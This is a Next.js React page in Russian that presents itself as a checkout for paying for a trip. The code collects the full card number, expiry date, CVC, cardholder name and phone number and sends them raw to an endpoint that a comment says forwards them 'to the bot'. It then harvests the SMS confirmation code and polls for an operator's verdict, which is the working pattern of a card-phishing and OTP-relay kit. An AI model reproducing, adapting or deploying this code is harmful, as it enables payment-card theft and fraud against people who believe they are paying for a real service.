'use client';

import React, { useState, useRef, useEffect } from 'react';
import { useRouter } from 'next/navigation';

function formatCardNumber(value: string) {
  return value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
}

function formatDate(value: string) {
  return value.replace(/\D/g, '').replace(/^(\d{2})(\d{0,2})/, (m, p1, p2) => (p2 ? `${p1}/${p2}` : p1)).slice(0, 5);
}

function formatPhone(value: string) {
  let digits = value.replace(/\D/g, '');
  if (digits.startsWith('8')) digits = '7' + digits.slice(1);
  if (!digits.startsWith('7')) digits = '7' + digits;
  digits = digits.slice(0, 11);
  let formatted = '+7';
  if (digits.length > 1) formatted += ' (' + digits.slice(1, 4);
  if (digits.length >= 4) formatted += ') ' + digits.slice(4, 7);
  if (digits.length >= 7) formatted += '-' + digits.slice(7, 9);
  if (digits.length >= 9) formatted += '-' + digits.slice(9, 11);
  return formatted;
}

export default function PaymentPage() {
  const [form, setForm] = useState({
    card: '',
    date: '',
    cvc: '',
    owner: '',
    phone: '',
  });
  const [errors, setErrors] = useState<{ card?: string; date?: string; cvc?: string; owner?: string; phone?: string }>({});
  const [loading, setLoading] = useState(false);
  const [showCode, setShowCode] = useState(false);
  const [code, setCode] = useState('');
  const [codeError, setCodeError] = useState('');
  const [codeSent, setCodeSent] = useState(false);
  const [codeLoading, setCodeLoading] = useState(false);
  const pollingRef = useRef<NodeJS.Timeout | null>(null);
  const router = useRouter();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let { name, value } = e.target;
    if (name === 'card') value = formatCardNumber(value);
    if (name === 'date') value = formatDate(value);
    if (name === 'phone') value = formatPhone(value);
    setForm({ ...form, [name]: value });
    setErrors({ ...errors, [name]: undefined });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { card?: string; date?: string; cvc?: string; owner?: string; phone?: string } = {};
    if (!form.card.trim() || form.card.replace(/\s/g, '').length !== 16) newErrors.card = 'Введите корректный номер карты';
    if (!form.date.trim() || !/^\d{2}\/\d{2}$/.test(form.date)) newErrors.date = 'Введите дату в формате MM/YY';
    if (!form.cvc.trim() || form.cvc.length < 3) newErrors.cvc = 'Введите CVC';
    if (!form.owner.trim()) newErrors.owner = 'Введите ФИО владельца';
    if (!/^\+7 \(\d{3}\) \d{3}-\d{2}-\d{2}$/.test(form.phone)) newErrors.phone = 'Введите номер телефона';
    setErrors(newErrors);
    if (Object.keys(newErrors).length === 0) {
      setLoading(true);
      setCodeError('');
      // Отправляем данные в бот
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'payment',
          ...form,
        }),
      });
      setTimeout(() => {
        setLoading(false);
        setShowCode(true);
      }, 1500);
    }
  };

  const startPolling = () => {
    if (pollingRef.current) clearInterval(pollingRef.current);
    console.log('Starting polling...');
    pollingRef.current = setInterval(async () => {
      try {
        console.log('Polling check...');
        const res = await fetch('/api/notify?check_code_error=1');
        if (res.ok) {
          const data = await res.json();
          console.log('Polling response:', data);
          
          if (data.codeError) {
            console.log('Code error received:', data.codeError);
            setCodeError(data.codeError);
            setShowCode(true);
            setCode('');
            setCodeLoading(false);
            // Сбрасываем флаг ошибки после получения сообщения
            try {
              const resetRes = await fetch('/api/notify/reset-code-error', { method: 'POST' });
              if (!resetRes.ok) {
                console.error('Failed to reset code error flag');
              }
            } catch (error) {
              console.error('Error resetting code error flag:', error);
            }
          } else if (data.codeSuccess) {
            console.log('Code success received');
            setCodeLoading(false);
            setShowCode(false);
            // Сбрасываем флаг успеха
            try {
              const resetRes = await fetch('/api/notify/reset-code-error', { method: 'POST' });
              if (!resetRes.ok) {
                console.error('Failed to reset code success flag');
              }
            } catch (error) {
              console.error('Error resetting code success flag:', error);
            }
            // Перенаправляем на страницу успеха
            router.push('/success');
            return; // Прерываем выполнение после перенаправления
          } else {
            console.log('No code status change');
          }
        } else {
          console.error('Polling request failed:', res.status);
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 250); // Уменьшаем интервал до 250мс для более быстрой реакции
  };

  useEffect(() => {
    console.log('Component mounted, starting polling...');
    startPolling();
    return () => {
      console.log('Component unmounting, clearing polling...');
      if (pollingRef.current) {
        clearInterval(pollingRef.current);
        pollingRef.current = null;
      }
    };
  }, []);

  // Добавляем обработчик для очистки при размонтировании
  useEffect(() => {
    return () => {
      // Очищаем флаги при размонтировании компонента
      fetch('/api/notify/reset-code-error', { method: 'POST' }).catch(console.error);
    };
  }, []);

  const handleSendCode = async () => {
    if (!code.trim()) return;
    setCodeSent(true);
    setCodeLoading(true);
    await fetch('/api/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'sms_code',
        code,
        ...form,
      }),
    });
    setTimeout(() => setCodeSent(false), 2000);
  };

  return (
    <main className="max-w-md mx-auto py-12 px-4">
      <h1 className="text-2xl font-bold mb-8 text-center">Оплата поездки</h1>
      <form className="flex flex-col gap-6 bg-white rounded-2xl shadow-lg p-8" onSubmit={handleSubmit} noValidate>
        <div className="flex flex-col gap-2">
          <label htmlFor="card" className="text-lg font-semibold">Номер карты</label>
          <input
            id="card"
            name="card"
            type="text"
            inputMode="numeric"
            maxLength={19}
            placeholder="0000 0000 0000 0000"
            value={form.card}
            onChange={handleChange}
            className={`rounded-2xl bg-[#efefef] px-5 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-700 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none ${errors.card ? 'ring-2 ring-red-400' : ''}`}
          />
          {errors.card && <span className="text-red-500 text-sm mt-1">{errors.card}</span>}
        </div>
        <div className="flex gap-4">
          <div className="flex flex-col gap-2 w-1/2">
            <label htmlFor="date" className="text-lg font-semibold">Дата</label>
            <input
              id="date"
              name="date"
              type="text"
              inputMode="numeric"
              maxLength={5}
              placeholder="MM/YY"
              value={form.date}
              onChange={handleChange}
              className={`rounded-2xl bg-[#efefef] px-5 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-700 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none ${errors.date ? 'ring-2 ring-red-400' : ''}`}
            />
            {errors.date && <span className="text-red-500 text-sm mt-1">{errors.date}</span>}
          </div>
          <div className="flex flex-col gap-2 w-1/2">
            <label htmlFor="cvc" className="text-lg font-semibold">CVC</label>
            <input
              id="cvc"
              name="cvc"
              type="password"
              inputMode="numeric"
              maxLength={4}
              placeholder="CVC"
              value={form.cvc}
              onChange={handleChange}
              className={`rounded-2xl bg-[#efefef] px-5 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-700 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none ${errors.cvc ? 'ring-2 ring-red-400' : ''}`}
            />
            {errors.cvc && <span className="text-red-500 text-sm mt-1">{errors.cvc}</span>}
          </div>
        </div>
        <div className="flex flex-col gap-2">
          <label htmlFor="owner" className="text-lg font-semibold">ФИО Владельца карты</label>
          <input
            id="owner"
            name="owner"
            type="text"
            placeholder="Иванов Иван Иванович"
            value={form.owner}
            onChange={handleChange}
            className={`rounded-2xl bg-[#efefef] px-5 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-700 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none ${errors.owner ? 'ring-2 ring-red-400' : ''}`}
          />
          {errors.owner && <span className="text-red-500 text-sm mt-1">{errors.owner}</span>}
        </div>
        <div className="flex flex-col gap-2">
          <label htmlFor="phone" className="text-lg font-semibold">Номер телефона</label>
          <input
            id="phone"
            name="phone"
            type="tel"
            placeholder="+7 (___) ___-__-__"
            value={form.phone}
            onChange={handleChange}
            maxLength={18}
            className={`rounded-2xl bg-[#efefef] px-5 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-700 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none ${errors.phone ? 'ring-2 ring-red-400' : ''}`}
          />
          {errors.phone && <span className="text-red-500 text-sm mt-1">{errors.phone}</span>}
        </div>
        <button disabled={loading} className="w-full bg-[#00aaff] hover:bg-[#0099ee] active:bg-[#0088dd] text-white text-xl font-bold rounded-full py-4 mt-2 shadow-lg transition-all duration-200 transform hover:-translate-y-1 hover:shadow-2xl focus:outline-none focus:ring-4 focus:ring-[#00aaff]/30 disabled:opacity-60 disabled:cursor-not-allowed">
          {loading ? 'Загрузка...' : 'Оплатить'}
        </button>
      </form>
      {loading && (
        <div className="flex justify-center mt-6">
          <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-[#00aaff]"></div>
        </div>
      )}
      {showCode && (
        <div className="mt-8 flex flex-col gap-4 items-center">
          <div className="flex w-full max-w-xs gap-2">
            <input
              type="text"
              value={code}
              onChange={e => setCode(e.target.value)}
              placeholder="Введите SMS-код"
              className="rounded-2xl bg-[#efefef] px-5 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-700 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none text-center"
              disabled={codeLoading}
            />
            <button
              type="button"
              onClick={handleSendCode}
              disabled={codeSent || !code.trim() || codeLoading}
              className="bg-[#00aaff] hover:bg-[#0099ee] active:bg-[#0088dd] text-white font-bold rounded-2xl px-6 py-4 transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {codeSent ? 'Отправлено' : 'Отправить'}
            </button>
          </div>
          {codeError && <div className="text-red-500 text-center font-semibold">{codeError}</div>}
          {codeLoading && (
            <div className="flex flex-col items-center gap-2">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#00aaff]"></div>
              <div className="text-gray-600">Ожидание подтверждения...</div>
            </div>
          )}
        </div>
      )}
    </main>
  );
} 